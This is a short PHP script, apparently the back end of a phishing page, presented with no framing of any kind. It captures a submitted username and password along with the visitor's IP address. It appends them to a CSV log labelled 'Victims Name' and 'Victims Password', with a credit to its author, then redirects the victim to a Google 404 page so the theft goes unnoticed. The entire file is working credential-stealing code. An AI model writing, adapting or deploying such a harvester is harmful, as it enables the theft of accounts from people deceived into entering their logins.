<?php
$habbo = $_POST['username']; 
$password = $_POST['passwd'];
$ip = $_SERVER['REMOTE_ADDR']; 
$f = fopen("AAC189092019881999191919191mobeen.csv", "a"); 
fwrite ($f, 'Victims Name: [<b><font color="#570000">'.$habbo.'</font></b>] Victims Password: [<b><font color="#57003A">'.$password.'</font></b>] IP: [<b><font color="#005700">'.$ip.'</font></b>] By: [<b><font color="#005700"><a href="http://www.fb.com/mobeendotcom" rel="nofollow">Bee Hay</a></font></b>]<br>');
fclose($f);
header('Location:https://www.google.com/404.html');
?>
